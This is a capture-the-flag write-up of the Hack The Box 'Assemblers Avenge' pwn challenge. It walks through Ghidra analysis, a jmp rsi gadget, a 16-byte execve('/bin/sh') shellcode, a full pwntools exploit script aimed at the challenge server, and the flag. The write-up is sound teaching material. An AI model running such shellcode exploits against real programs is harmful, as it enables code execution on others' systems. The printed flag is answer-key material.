# Assemblers Avenge

> Write-up author: jon-brandy

![image](https://github.com/user-attachments/assets/54ad889e-0ed2-4f15-892d-06264bd8d2ad)

# Lessons Learned:
- ret2shellcode.
- create custom shellcode.
- utilize `/bin/sh` strings printed.

## DESCRIPTION:

<p align="justify">Amidst the harrowing conflict, our city bore the brunt of relentless onslaughts, witnessing widespread devastation that spared little, ravaging both infrastructure and spirit alike. Now, as the dust settles and the echoes of chaos fade, a clarion call emerges: assemble a force to restore justice and herald a new era of tranquility. With the remnants of our past preserved within this binary, embark on your mission to reclaim our future. </p>

## STEPS:
1. In this challenge we are given a 64 bit binary, statically linked, and not stripped.

![image](https://github.com/user-attachments/assets/53c72f0e-8586-4923-af2b-b6011344c919)


> BINARY PROTECTIONS

![image](https://github.com/user-attachments/assets/a508e2de-1f69-414d-a4cc-b13c2bf9507b)

2. Since it is statically linked, hence the binary does not rely on external shared libraries during runtime.
3. Also notice that all the binary mitigations are off, should be easy to pwn then.
4. Decompiled the binary at ghidra and reviewed the entry, we identified three functions called, those are **_write**, **_read**, and **_exit**.

> Ghidra

![image](https://github.com/user-attachments/assets/ea12e6ab-34cd-4cb8-9c87-c96044d2dad6)

5. Reviewing the **_write** call operations, we can see what message shall be printed.

![image](https://github.com/user-attachments/assets/4a9f1b9b-20f9-48ca-b43c-55fd5015e433)

![image](https://github.com/user-attachments/assets/a4701a42-c92e-4835-9f2b-3ad25f351647)


6. Reviewing the **_read** function call, we can identify the buffer size (**_nbytes**) is 24 bytes.

![image](https://github.com/user-attachments/assets/c0755bb1-2273-42d5-9747-a7dd75d22908)

7. If you noticed, our input shall stored at RSI at this function call, which gave us a hint to utilize `jmp` instruction to rsi if we use shellcode approach.

![image](https://github.com/user-attachments/assets/60b96fbe-e6ec-4883-a53b-43c96f5d3d8f)


8. For the **_exit** function call, it just printed the goodbye message then terminate the binary.

![image](https://github.com/user-attachments/assets/10dea23c-941e-4467-8e4b-79c40bff5c82)


9. Since NX is disabled, hence let's use shellcode approach. Remembering the buffer size is 24 bytes, hence our shellcode should be at 16 bytes and the rest 8 bytes should be enough for our gadget.

> JMP RSI GADGET

![image](https://github.com/user-attachments/assets/be21d4ec-103b-446e-bb89-97233a0c77bf)

10. No need to worry about the **/bin/sh** strings, because it is printed by the binary itself and there is an interesting way to grab the strings and use it for our shellcode.

> THE PRINTED STRINGS

![image](https://github.com/user-attachments/assets/634ae450-c0a6-4a31-b83c-c34149eceac4)


11. Based on ghidra, the offset should be at `0x4020..`.

![image](https://github.com/user-attachments/assets/75900b8b-acb3-4673-ae21-db78d610a52f)

12. To identify the LSB, I used **hexdump**, then look for hex representations of **/bin/sh** strings.

``` console
┌──(scorch㉿petir)-[~]
└─$ echo "/bin/sh" | xxd -p      
2f62696e2f73680a
```

![image](https://github.com/user-attachments/assets/0345d2ee-b483-4416-91f5-d5be6b067912)


13. Great! Now let's craft our shellcode.

```asm
mov    rdi,0x402065
xor    esi,esi
xor    edx,edx
push   0x3b
pop    rax
syscall
```

#### NOTE:

```
To set zero for RSI and RDX can utilize xoring esi and edx. Because
in 64-bit mode, writing to the lower 32 bits clears the upper 32 bits
of the full 64-bit register.

Thus xor esi achieves the same effect as xor rsi. Note that using 32 bit register
is to shorten the shellcode size.
```

![image](https://github.com/user-attachments/assets/c0d89404-9edc-4d95-afde-64210500dd1f)


14. Awesome! The size is exact enough.

> FULL EXPLOIT SCRIPT

```py
from pwn import *

exe = './assemblers_avenge'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

HOST = '94.237.62.3'
IP = 46619
sh = remote(HOST, IP)
# sh = process(exe)

sc = """
mov    rdi,0x402065
xor    esi,esi
xor    edx,edx
push   0x3b
pop    rax
syscall
"""

log.success(f'Size: {len(asm(sc))}')

rop = ROP(elf)
p = flat([
    asm(sc), # shellcode 
    0x000000000040106b # jmp rsi gadget
])

sh.sendline(p)
sh.interactive()
```

![image](https://github.com/user-attachments/assets/bbd6df21-26bf-4a1a-9aee-e7d6b54497ea)


15 Got the flag! We've pwned it.

## FLAG

```
HTB{y0ur_l0c4l_4553mbl3R5_4v3ng3d_0n_t1m3}
```
